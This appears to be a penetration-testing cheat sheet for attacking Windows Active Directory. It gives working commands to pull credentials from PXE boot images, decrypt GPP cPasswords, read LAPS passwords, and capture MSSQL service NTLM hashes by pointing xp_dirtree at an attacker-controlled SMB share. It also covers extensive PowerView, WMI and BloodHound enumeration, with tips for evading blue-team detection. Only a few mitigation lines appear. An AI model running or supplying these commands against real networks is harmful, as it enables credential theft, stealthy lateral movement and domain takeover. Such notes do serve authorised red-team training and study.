**Preboot Execution Environment (PXE)** boot enables a computer to load an OS over a network connection. MDT can be used to create, manage, and host PXE boot images. 
PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP, the host is allowed to request the PXE boot image and start the network OS installation process.

Following the flow of the PXE boot:

![[PXE-boot-flow.png]]Once the process is performed, the client will use a **TFTP connection** to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install. 

At step *6* the user receives the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture.

They also contain the **PXE Boot Image Location** consisting into the path of the **WIM File**, a bootable image in the **Windows Images Format (WIM)**. This is obtainable from the BCD file using the `PowerPXE` powershell script.

It's then possible to retrieve these BCD file with a TFTP client (step *7-8*). **The BCD files are always located in the /Tmp/ directory on the MDT server**.

0 - Request an IP to the DHCP, retrieve BCD file path, retrieve WIM File path and extract  credentials with `PowerPXE`:

~~~powershell
Import-Module .\PowerPXE.ps1
Get-PXEcreds -InterfaceAlias <interface>
~~~

Or manually (requires the BCD file path to be known):

1 - Retrieve BCD file with the TFTP client:

~~~shell
tftp -i <MDT Server IP> GET "\Tmp\<bcd file>.bcd" conf.bcd
~~~

2 - Use `PowerPXE` to extract the WIM File path (the **PXE Boot Image Location**):

~~~powershell
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
...
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
~~~

3 - Retrieve the WIM File with the TFTP client:

~~~shell
tftp -i <MDT Server IP> GET "<PXE Boot Image Location>" pxeboot.wim
~~~

4 - Use `PowerPXE` to extract the credentials stored within the WIMFile:

~~~powershell
Get-FindCredentials -WimFile pxeboot.wim
~~~

Useful Resources:

- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
#### Mitigations

- To avoid an attacker with access to the corporate network booting into PXE, it is strongly recommended that the ability to boot this way is limited to specific network areas, such as dedicated rooms with physical access control.
- It is also recommended to require a password before starting the deployment. This can be configured by checking the "*Require a Password when computers use PXE*" checkbox in the SCCM configuration.
- Follow Microsoft's recommendations for deploying PXE,

### Group Policy Preferences - GPP

Microsoft implemented a method to change local administrator accounts across workstations using **Group Policy Preferences (GPP)**. Until 2015, GPP relevant XML files, such as **Groups.xml**, were stored in the SYSVOL. These files contain encrypted passwords using AES-256 bit encryption:

- The password is stored in the **cPassword** field.

There are other files that can contain encrypted passwords:

 - Groups.xml
 - Services.xml 
 - Scheduledtasks.xml 
 - DataSources.xml 
 - Printers.xml 
 - Drives.xml

At that time, the encryption was good enough until Microsoft somehow published its private key making easy to decrypt the stored passwords.

- **Even though the issue has been fixed, the patch is not retroactive for existing users**

Find GPP Passwords in SYSVOL:

~~~shell
findstr /S cpassword $env:logonserver\sysvol\*.xml # Powershell
findstr /S cpassword %logonserver%\sysvol\*.xml # CMD
~~~

Find and decrypt GPP passwords remotely with `impacket`'s `Get-GPPPassword`:

~~~shell
impacket-Get-GPPPassword '<domain>/<user>':'<password>'@'<target dc>'
~~~

Find and decrypt GPP passwords remotely with `nxc`:

~~~shell
nxc smb <target dc> -u <user> -p <password> -M gpp_password
~~~

If some GPP relevant file is obtained from SYSVOL, it's possible to crack every password entry with the following command:

~~~shell
gpp-decrypt <cPassword>
~~~

If previous command does not work correctly, try this bash script [gpp-decrypt.sh](https://gist.githubusercontent.com/rmrt1n/f1b01a4017036514cc2aac654f372fc7/raw/ce17d39c26f58c9543ba0848a59aa67e9baf5522/gpp-decrypt.sh):

~~~shell
gpp-decrypt.sh <cPassword>
~~~

Moreover, the script [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) from PowerSploit exfiltrates and cracks GPP passwords:

~~~powershell
Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
~~~

Consider also trying Metasploit `auxiliary/scanner/smb/smb_enum_gpp` module.

### Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the **Local Administrator Password Solution (LAPS),** which offers a much more secure approach to remotely managing the local administrator password.
LAPS includes two new attributes of computer objects in the Active Directory:

- `ms-mcs-AdmPwd`: contains a clear-text password of the local administrator. By default, it can only be viewed by Domain Admins , and unlike other attributes, is not accessible by Authenticated Users.
- `ms-mcs-AdmPwdExpirationTime`: contains the expiration time to reset the password. 

LAPS uses `admpwd.dll`, usually located at `C:\Program Files\LAPS\CSE` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.

The `Find-AdmPwdExtendedRights` from the `AdmPwd.PS` module can list all groups with rights to read the `ms-mcs-AdmPwd`. If the attacker controls an user that belongs to one of these groups, him can access to the local Administrator password.

Moreover, when a machine joins a domain, an object of the class “computer” is created in the Active Directory. The user account used to create this object, i.e. joining a machine, is defined as the **owner** of this object.
The owner of an object, inherited from the class “computer”, has by default the privilege `ExtendedRight` (`All extended rights `in the GUI) that allows access to the LAPS password. If the attacker controls an user with the `ExtendedRight` privilege, him can access to the local Administrator password.

**Note**: often a dedicated service account is used to join machines to domain; if LAPS is broadly used across various workstations with the same service account used to join to the domain, compromising this service accounts can compromise all the workstations's local Administrators.

Import `AdmPwd.PS` module, if not imported:

~~~powershell
Import-Module AdmPwd.PS
~~~

Find groups with privileges to access the `ms-mcs-AdmPwd` attribute:

~~~powershell
Find-AdmPwdExtendedRights -Identity <OU or *>
~~~

If any group is returned, check groups members:

~~~powershell
net groups "<found group>"
~~~

From a compromised user part of one of the previous groups, get the content of the`ms-mcs-AdmPwd` attribute:

~~~powershell
Get-AdmPwdPassword -Computer Name <local computer name>

# Or using PowerView
Get-DomainComputer <Computer Name> -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
~~~

Alternatively, check if any of the compromised accounts is the owner of the "computer" object in the AD (i.e. is the account used to join the computer to the domain) and therefore has the `ExtendedRights` privilege:

~~~powershell
Import-module ActiveDirectory

## Extract the default configuration for a "computer" object
$computerobject = Get-ADObject -SearchBase (Get-ADRootDSE).SchemaNamingContext -Filter {Name -eq "Computer" } -Properties defaultSecurityDescriptor

## Create an object allowing managing the ACLs
$sec = New-Object System.DirectoryServices.ActiveDirectorySecurity

$sec.SetSecurityDescriptorSddlForm($computerobject.defaultSecurityDescriptor)

## List the privileges of the object owneer
$acc = New-Object System.Security.Principal.NTAccount("CREATOR OWNER") ## Note: the principal name may be different if AD is installed with another language

$sec.GetAccessRules($true,$false,[System.Security.Principal.NTAccount]) | Where-Object {$_.IdentityReference -eq $acc}
~~~

If in the resulting info there's the `Extended Right` privilege corresponding to the `ActiveDirectoryRights` attribute, then the account can read the `ms-mcs-AdmPwd` attribute.

Another useful tool is [LAPS Toolkit](https://github.com/leoloobeek/LAPSToolkit).

References:

- [Taking over workstation thanks to LAPS](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)

### MSSQL NTLM hash dump

Having access to a MSSQL session, if the current service account can use `xp_dirtree`, `xp_fileexist` or `xp_subdirs` stored procedures, it could be possible to capture the MSSQL service account's NTLM hash by setting up an SMB share using Impacket's `smbserver`. 

- These stored procedures are used to list files and directories in a folder. By setting this target folder to the Impacket's `smbserver`, the NTLM hash will be passed to it.

If the MSSQL service is running under a high-privilege account (such as Domain Admin or Local Admin) and the password is weak (quite common), it could be possible to crack
the password and perform a lateral movement or gain access to the whole Active Directory.

Run `xp_dirtree` or `xp_subdirs` stored procedures:

~~~shell
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
~~~

Relay NTLM as for SMB Relay.

## Internal Enumeration

### Network Credentials Injection

Often, in security assessments, you will have network access and have just discovered AD credentials but have no means or privileges to create a new domain-joined machine. So we need the ability to use those credentials on a Windows machine we control.

With the command `runas` is possible to inject the discovered AD credentials in memory and then **use them for network level authentication** (Kerberos or NTLM) and interact with domain services even though the machine is not joined to the domain.

~~~shell
runas.exe /netonly /user:<domain>\<username> cmd.exe
~~~

- **/netonly** - Commands are executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
- **/user** - The details of the domain and the username. It is always a safe bet to use the **Fully Qualified Domain Name (FQDN)** instead of just the **NetBIOS** name of the domain since this will help with resolution.
- **cmd.exe** - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since allows then to launch any other program with the credentials injected.

**Note**: it's always helpful to run the first cmd as Administrator since this will inject and Administrative token in the CMD. **This DOES NOT give you administrative privileges on the network**, it just ensure that any **local** command gets executed with administrative privileges.

In a scenario where the attacker has no direct network access to the AD network BUT it manages to obtain a local account hash and, performing pass the hash, it connects to a remote machine into the AD network,  when using tools like `evil-winrm`, `impacket-smbexec` or `impacket-wmiexec`, `runas.exe` password prompt will not work. In thise cas, it's possible to obtain the same result using [RunasCs](https://github.com/antonioCoco/RunasCs): 

~~~powershell
# Powershell wrapper
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Domain <domain> -Username <user> -Password <password> -Command '<command>' -LogonType 9

# C# Executable
.\RunasCs.exe <user> <password> '<command>' -d <domain> -l 9 
~~~

**Note**: `-l 9` / `-LogonType 9` = `LOGON32_LOGON_NEW_CREDENTIALS`, which is exactly what `runas /netonly` does - current session stays as your local user, but any outbound network auth uses the injected domain creds.


Once the previous `runas` command get executed, the network credential gets injected into memory; all network communication generate from application executed from the opened command line terminal will use these injected credentials for authentication.
For example, it's possible to run the **Microsoft Management Console (MMC)** and visually enumerate forests, domain, OUs, and objects. 

Another example is to launch `sharphound` from the attacker-controlled machine with the credentials injected; this allows to circumvent the problem of AVs blocking `sharphound`, **even though, it remains a noisy tool and it can still be detected by blue teams**. 

- If MMC is not installed, enable **Remote Server Administraton Tools (RSAT)** from control panel.

Enumeration with the Microsoft Management Console (MMC):

~~~shell
mmc.exe # eventually run in previous runas cmd terminal
~~~

In MMC:

1. Click **File** -> **Add/Remove Snap-in**
2. Select and **Add** all three Active Directory Snap-ins
3. Click through any errors and warnings  
4. Right-click on **Active Directory Domains and Trusts** and select **Change Forest**
5. Enter the target domain as the **Root domain** and Click **OK**
6. Right-click on **Active Directory Sites and Services** and select **Change Forest**
7. Enter target domain as the **Root domain** and Click OK
8. Right-click on **Active Directory Users and Computers** and select **Change Domain**
9. Enter target domain as the **Domain** and Click **OK**
10. Right-click on **Active Directory Users and Computers** in the left-hand pane  
11. Click on **View** -> **Advanced Features**
#### Force NTLM Authentication over Kerberos

When the **hostname** is provided, network authentication will attempt first to perform Kerberos authentication since Kerberos authentication uses hostnames embedded in the tickets. 
- **if the IP is instead provided, it's possible to force the authentication type to be NTLM**.

In some scenarios, this can be useful to avoid detection.

### SYSVOL

**SYSVOL** is a folder that exists on all domain controllers. It is a shared folder storing the **Group Policy Objects (GPOs)** and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

- **Any AD account, no matter how low-privileged, can read the contents of the SYSVOL directory.**

It is good to enumerate its contents since there may be some additional AD credentials or other useful information in there.

### DNS Enumeration

By default any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer .

Dump DNS record from DC with [adidnsdump](https://github.com/dirkjanm/adidnsdump):

~~~shell
adidnsdump -u '<domain>\<user>' -p '<password>' <target host>
~~~
### Command Line & Powershell Enumeration

CMD has a built-in command that we can use to enumerate information about AD, namely `net`. The `net` command is a handy tool to enumerate information about the local system and AD.
No additional or external tooling is required, and  `net` commands are often not monitored for by the Blue team. However,  `net` commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
Moreover,  `net` commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.

PowerShell permits to obtain more complex enumeration results thanks to his **cmdlets** within the **Active Directory Module** generally installed via *RSAT* toolkit\*. Moreover, various advanced enumeration cmdlets exists, such as the  [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) script, part of the "Recon" module of the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) collection. A .NET port for `PowerSploit` is [SharpSploit](https://github.com/cobbr/SharpSploit).
Another alternative is [ADRecon](https://github.com/adrecon/ADRecon).

- Using **Active Directory Module** there are very low chances of detection by AV, very wide coverage by cmdlets, good filters for cmdlets, signed by Microsoft etc. 
- However, PowerShell is often monitored more by the blue teams than Command Prompt and the AD-RSAT tooling need to be installed. The alternative is to use other, potentially detectable, enumeration scripts.
- PowerSploit has been deprecated and is no longer mantained!

\*Note: If *RSAT* is not available, it's possible to directly import the [Active Directory Module's DLL](https://github.com/samratashok/ADModule) with the `Import-Module` PowerShell cmdlet. **This operation does NOT require elevated privileges**.

A more manual enumeration is possible by using  powershell's **Windows Management Instrumentation (WMI)** cmdlet. WMI is the infrastructure for management data and operations on Windows-based operating systems generally used to automate administrative tasks on remote computers.
WMI has a provider called `root\directory\ldap` which can be used for interaction with the active directory environment. Each class contained in this is provider is prefixed; each prefix has a meaning:

- Classes with `ds_` prefix are dynamic. These classes are the only ones useful to us since they allow retrieval of instances.
- Classes with `ads_` prefix are abstract.
- Classes with `win32_` prefix contain data about processes, users, groups, events, etc.

\*Note: by default WMI provides remote access only to **local administrators**. In order to run WMI commands against a remote computer, the user used must be also a local administrator on the remote computer.

#### Command Line Enumeration

List all registered SPNs in a DC:

~~~shell
setspn -T <domain> -Q */*
~~~

Enumerate all users in the AD:

~~~shell
net user /domain
~~~

Get details about a user in the AD:

~~~shell
net user <user> /domain
~~~

Enumerate all groups in the AD:

~~~shell
net group /domain
~~~

Get details about a group in the AD:

~~~shell
net group <group> /domain
~~~

Get details about domain password policy:

~~~shell
net accounts /domain
~~~

List applied GPO:

~~~shell
gpresult /R /V 
~~~

#### Powershell Enumeration

Get domain information:

~~~powershell
# PowerView
Get-NetDomain [-Domain <domain>]

# AD Module
Get-ADDomain [-Identity <domain>]
~~~

Get domain SID:

~~~powershell
# PowerView
Get-DomainSID

# AD Module
(Get-ADDomain).DomainSID
~~~

Get a list of all operating systems on the domain: 

~~~powershell
# PowerView
Get-NetComputer
Get-NetComputer -OperatingSytem "*Server 2019*"
Get-NetComputer -Ping

# AD Module
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} # Ping
~~~

**Note**: the existence of a computer object does not necessarily imply that in the network this computer really exists i.e. it could be just be an object in the LDAP but not mapped with a real computer or VM.

Gets a list of all users on the domain (`PowerView`):

~~~powershell
# PowerView
Get-NetUser | select cn

# AD Module
Get-ADUser -Filter * -Properties *
~~~

Get list of admin domain users:

~~~powershell
# AD Module
Get-ADUser -Filter * -Properties * | select name,adminCount
~~~

Get details about a user in the AD:

~~~powershell
# PowerView
Get-NetUser -Identity <username>

# AD Module
Get-ADUser -Identity <user> -Server <DC> -Properties *
~~~

Get user last set date for password:

~~~powershell
# PowerView
Get-NetUser | select cn,pwdlastset

# AD Module
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
~~~

Get user wrong password count:

~~~powershell
# PowerView
Get-NetUser | select cn,badpwdcount

# AD Module
Get-ADUser -Filter * -Properties * | select name,badpwdcount
~~~

Get the list of all available users' properties:

~~~powershell
# PowerView
Get-NetUser | select -First 1 | Get-Member -MemberType "*Property" | select Name

# AD Module
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType "*Property" | select Name
~~~

Search user by property:

~~~powershell
# PowerView
Get-NetUser | where -Property Description -Like "*built*" | select name,description

# AD Module
Get-ADUser -Filter 'Description -like "*something*"' -Properties Description | select name,description
~~~

Check whether the current user has local admin access on a computer:

~~~powershell
# PowerView
Find-LocalAdminAccess -Verbose # Automated: uses Invoke-CheckLocalAdminAccess for every machine on the current domain

# PowerView
Invoke-CheckLocalAdminAccess -Computer <computer name>

# Useful when RPC and SMB, generally used by Find-LocalAdminAccess, are blocked
Find-WMILocalAdminAccess
Find-WMILocalAdminAccess -ComputerFile .\computers.txt -Verbose
Find-PSRemotingLocalAdminAccess 
~~~

- [Find-WMILocalAdminAccess.ps1](https://github.com/RedTeamMagic/Powershell/blob/main/Find-WMILocalAdminAccess.ps1)
- [Find-PSRemotingLocalAdminAccess.ps1](https://github.com/RedTeamMagic/Powershell/blob/main/Find-PSRemotingLocalAdminAccess.ps1)

**Note**: running those script for chunks of machines instead of a single run (all domain machines) can lower the chances to be detected since they generate an high  activity.

Find local admins on all machines of the domain (needs administrator privs on non-dc machines:

~~~powershell
# PowerView
Invoke-EnumerateLocalAdmin -Verbose # Automated: uses Get-NetLocalGroup on every computer in the domain
~~~

Find computers where a domain admin (or specified user/group) has sessions:

~~~powershell
# PowerView
Invoke-UserHunter # Automated: queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list of computers ( Get-NetComputer) and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -CheckAccess # To confirm admin access
Invoke-UserHunter -Stealth # it goes for high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation
~~~

Enumerate domain groups:

~~~powershell
# PowerView
Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -GroupName "*admin*"
Get-NetLocalGroup -ComputerName <computer name> # Local group (needs admin privs on non-dc machine)

# AD Module
Get-ADGroup -Filter * -Properties *
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
~~~

Enumerate **domain** groups membership:

~~~powershell
# PowerView
Get-NetGroupMember -Identity "Domain Admins" -Recurse # By group
Get-NetGroup -UserName <username> # By username
 
# AD Module
Get-ADGroupMember -Identity "Domain Admins" -Recursive # By group
Get-ADPrincipalGroupMembership -Identity <username> # By username
~~~

**Note**: `-Recurse` and `-Recursive` are needed to expand memberships of nested groups.

Enumerate **local** groups membership (needs administrator privileges on non-dc machines)(`Powerview`):

~~~powershell
Get-NetLocalGroupMember -ComputerName <computer name>
Get-NetLocalGroupMember -GroupName <group name>
~~~

Get domain policy (`PowerView`):

~~~powershell
Get-DomainPolicy [-Domain <domain>]
(Get-DomainPolicy)."SystemAccess"
(Get-DomainPolicy)."KerberosPolicy"
~~~

Get the list of active logged users on a computer (needs admin privileges on the target)(`Powerview`):

~~~powershell
Get-NetLoggedon -ComputerName <computer name>
~~~

Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)(`PowerView`):

~~~powershell
Get-LoggedonLocal -ComputerName <computer name>
Get-NetSession -ComputerName <computer name>
~~~

Get the last logged user on a computer (needs administrative rights and
remote registry on the target)(`PowerView`):

~~~powershell
Get-LastLoggedOn -ComputerName <servername>
~~~

Enumerate SMB shares for current computer (`PowerView`):

~~~powershell
Get-SmbShare
~~~

Find shares on hosts in current domain (`PowerView`):

~~~powershell
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC # exclude default shares
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC # exclude default shares 
~~~

Find sensitive files on computers in the domain (`PowerView`):

~~~powershell
Invoke-FileFinder -Verbose
~~~

Get all file-servers of the domain (`PowerView`):

~~~powershell
Get-NetFileServer
~~~

Get list of GPO in current domain

~~~powershell
#PowerView
Get-NetGPO

#AD Module
Get-GPO -All
Get-GPOReport -ReportType Html -Path <absolute output path>
~~~

Get list of GPOs applied to a computer (deprecated):

~~~powershell
# PowerView
Get-NetGPO -ComputerName <computer name> 
~~~

Get list of permissions associated to a GPO:

~~~powershell
# AD Module
Get-GPPermission -Name "<gpo name>" -All
~~~

Get list of GPO restricted groups:

~~~powershell
# PowerView
Get-NetGPOGroup
~~~

Get users which are in a local group of a machine using GPO restricted groups:

~~~powershell
# PowerView
Find-GPOComputerAdmin -ComputerName <computer name>
~~~

Get machines where the given user is member of a specific GPO restricted group:

~~~powershell
# PowerView
Find-GPOLocation -Identity <username> -Verbose
~~~

Get OUs in a domain:

~~~powershell
# PowerView
Get-NetOU

# AD Module
Get-ADOrganizationalUnit -Filter * -Properties *
~~~

Get GPO applied on an OU:

~~~powershell
# PowerView
Get-NetGPO -Identity "{<gplink attribute's CN part from Get-NetOU>}"

# AD Module
Get-GPO -Guid "<gPLink attributes's CN part from Get-ADOrganizationalUnit>"
~~~

Enumerate ACLs :

~~~powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs # get all
Get-ObjectAcl -Identity <username or group>  -ResolveGUIDs # by username or group
Get-ObjectAcl -ADSpath "LDAP://<Object DN>" -ResolveGUIDs -Verbose
Get-PathAcl -Path "<path>"
Invoke-ACLScanner -ResolveGUIDs # Look for intersing ACEs

# AD Module
(Get-Acl 'AD:\<Object DN>').Access
~~~

Get details about a forest:

~~~powershell
# PowerView
Get-NetForest
Get-NetForest -Identity <forest name>

# AD Module
Get-ADForest
Get-ADForest -Identity <forest name>
~~~

Get all domains in a forest:

~~~powershell
# PowerView
Get-NetForestDomain
Get-NetForestDomain -Forest <forest name>
Get-NetForestTrust
Get-NetForestTrust -Forest <forest domain>

# AD Module
(Get-ADForest).Domains
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
~~~

Enumerate domains and forests trusts:

~~~powershell
# PowerView
Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain>

# AD Module
Get-ADTrust -Filter *
~~~

Get all global catalogs for a forest:

~~~powershell
# PowerView
Get-NetForestCatalog
Get-NetForestCatalog -Forest <forest name>

# AD Module
(Get-ADForest).GlobalCatalogs 
~~~

Get all local users that haven't password:

~~~powershell
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | Select Name, PasswordRequired | where -Property PasswordRequired -NE True
~~~

Get PowerShell history:

~~~powershell
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
~~~


#### Using .NET classes

Use .NET classes to enumerate domains:

~~~powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
~~~

References:

- [PowerView Docs](https://powersploit.readthedocs.io/en/latest/Recon/)

#### WMI Enumeration

Enumerate computers on which the current user has *local administrator* privileges:

~~~powershell
$pcs = Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select -ExpandProperty ds_cn
foreach ($pc in $pcs) {
    (Get-WmiObject -Class win32_computersystem -ComputerName $pc -ErrorAction silentlycontinue).name
}
~~~

Finding the domain name:

~~~powershell
Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select ds_dc, ds_distinguishedname, pscomputername
~~~

Getting the domain policy:

~~~powershell
Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select ds_lockoutduration, ds_lockoutobservationwindow, ds_lockoutthreshold, ds_maxpwdage, ds_minpwdage, ds_minpwdlength, ds_pwdhistorylength, ds_pwdproperties
~~~

\*Note: All the timestamps in the above output are stored as negative “filetimes”, i.e. represented as negative integers of 100 nanosecond timeslices. 

- Divide those values by *-600000000* to obtain the amount of minutes.

Finding workstations and the domain controller:

~~~powershell
Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | where { $_.ds_useraccountcontrol -match <user type constant>} | select ds_cn, ds_dnshostname, ds_operatingsystem, ds_lastlogon, ds_pwdlastset
~~~

where `<user type constant>` is a User Account Control (UAC) constant mapped as follows:

| User Type          | Hex Value | Constants |
| ------------------ | --------- | --------- |
| Normal User        | 0x200     | 512       |
| Workstation/Server | 0x1000    | 4096      |
| Domain Controller  | 0x82000   | 532480    |

Finding users:

~~~powershell
Get-WmiObject -Class win32_useraccount | select name, domain, accounttype
~~~

It's possible to filter by `AccountType` property with the following contants:

| Account Type                | Identifier                     | Constant |
| --------------------------- | ------------------------------ | -------- |
| Temporary Duplicate Account | `UF_TEMP_DUPLICATE_ACCOUNT`    | 256      |
| Normal Account              | `UF_NORMAL_ACCOUNT`            | 512      |
| Interdomain Trust Account   | `UF_INTERDOMAIN_TRUST_ACCOUNT` | 2048     |
| Workstation Trust Account   | `UF_WORKSTATION_TRUST_ACCOUNT` | 4096     |
| Server Trust Account        | `UF_SERVER_TRUST_ACCOUNT`      | 8192     |

Example:

~~~powershell
Get-WmiObject -Class win32_useraccount -Filter 'accounttype=512' | select name, domain, accounttype
~~~

Filter users by domain:

~~~powershell
Get-WmiObject -Class win32_useraccount -Filter 'domain="<domain name>"' | select caption
~~~

Enumerating currently logged-on users:

~~~powershell
Get-WmiObject -Class win32_loggedonuser | foreach {[wmi]$_.antecedent}
~~~

Enumerating groups for a domain:

~~~powershell
Get-WmiObject -Class win32_groupindomain | foreach {[wmi]$_.partcomponent}
~~~

Enumerating group memberships:

~~~powershell
Get-WmiObject -Class win32_groupuser | where { $_.groupcomponent -match '<goup name>' } | foreach {[wmi]$_.partcomponent}
~~~

Enumerate all the machines in the domain:

~~~powershell
Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select ds_cn
~~~

Enumerate antivirus on workstations:

~~~powershell
Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct # see note below
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct # see note below
Get-Service WinDefend # Check for windows defender
Get-Service | Where-Object { $_.DisplayName -like "*Defend*" -or $_.DisplayName -like "*McAfee*" -or $_.DisplayName -like "*Symantec*" -or $_.DisplayName -like "*Kaspersky*" }
Get-Process | Where-Object { $_.ProcessName -like "*McShield*" -or $_.ProcessName -like "*avp*" }
~~~

\*Note: these commands would not work with Windows Server 2019

### Linux Enumeration

Get domain information with `adcli`:

~~~shell
adcli info <domain>
~~~

### BloodHound/Sharphound

Collect information for `Bloodhound`:

~~~shell
# Using exe
Sharphound.exe --CollectionMethods <Methods> --Domain <domain> --ExcludeDCs

# Using ps1
. ./Sharphound.ps1
Invoke-BloodHound -CollectionMethods <Methods> -Domain <domain> -ExcludeDCs
~~~

Where:

- **CollectionMethods**: Determines what kind of data `sharphound` would collect. The most common options are Default or All. Also, since `sharphound` caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
- **Domain** - The domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
- **ExcludeDCs** -This will instruct `sharphound` not to touch domain controllers, which reduces the likelihood that the `sharphound` run will raise an alert.

\*Note 1: `Sharphound.ps1` is less likely to be blocked by AVs.
\*Note 2: When running `Sharphound.ps1` from memory, better specify the output directory with the `-OutputDirectory` parameter.

Collect information for `Bloodhound` remotely with [BloodHound.py Ingestor](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce):

~~~shell
bloodhound-ce-python --zip -c <Methods> -d <target domain> -u <user>@<domain> -p <password> -dc <target DC> [-ns <DNS server>]
~~~

References:

- [Sharphound](https://github.com/BloodHoundAD/SharpHound)

#### Interesting BloodHound Queries

Cool reference [here](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/).

Find instances where a computer has the "AdminTo" relationship over another computer:

~~~
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
~~~

Find users and groups ACLs on every node:

~~~cypher
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true RETURN p


// Might be too complex
MATCH p=(u:Group)-[r1]->(n) WHERE r1.isacl=true RETURN p

// Excluding administrative groups which might not be too interesting
MATCH p=(u:Group)-[r1]->(n)WHERE not (u.name contains "DOMAIN ADMIN") and not (u.name contains "KEY ADMINS") and not (u.name contains "ACCOUNT OPERATORS") and not (u.name contains "ENTERPRISE ADMINS") and not (u.name contains "ENTERPRISE KEY ADMINS")  and not (u.name contains "ADMINISTRATORS") and r1.isacl=true RETURN p
~~~

Find users and groups ACLs on every user:

~~~cypher
MATCH p=(u:User)-[r1]->(n:User) WHERE r1.isacl=true RETURN p


// Might be too complex
MATCH p=(u:Group)-[r1]->(n:User) WHERE r1.isacl=true RETURN p

// Excluding administrative groups which might not be too interesting
MATCH p=(u:Group)-[r1]->(n:User) WHERE not (u.name contains "DOMAIN ADMIN") and not (u.name contains "KEY ADMINS") and not (u.name contains "ACCOUNT OPERATORS") and not (u.name contains "ENTERPRISE ADMINS") and not (u.name contains "ENTERPRISE KEY ADMINS")  and not (u.name contains "ADMINISTRATORS") and r1.isacl=true RETURN p
~~~

Find users and groups ACLs on every group:

~~~cypher
MATCH p=(u:User)-[r1]->(n:Group) WHERE r1.isacl=true RETURN p


// Might be too complex
MATCH p=(u:Group)-[r1]->(n:Group) WHERE r1.isacl=true RETURN p

// Excluding administrative groups which might not be too interesting
MATCH p=(u:Group)-[r1]->(n:User) WHERE not (u.name contains "DOMAIN ADMIN") and not (u.name contains "KEY ADMINS") and not (u.name contains "ACCOUNT OPERATORS") and not (u.name contains "ENTERPRISE ADMINS") and not (u.name contains "ENTERPRISE KEY ADMINS")  and not (u.name contains "ADMINISTRATORS") and r1.isacl=true RETURN p
~~~

Find all users and groups that can RDP to a machine:

~~~cypher
MATCH p=(m:User)-[:CanRDP]->(c:Computer) RETURN p
MATCH p=(m:Group)-[:CanRDP]->(c:Computer) RETURN p
~~~

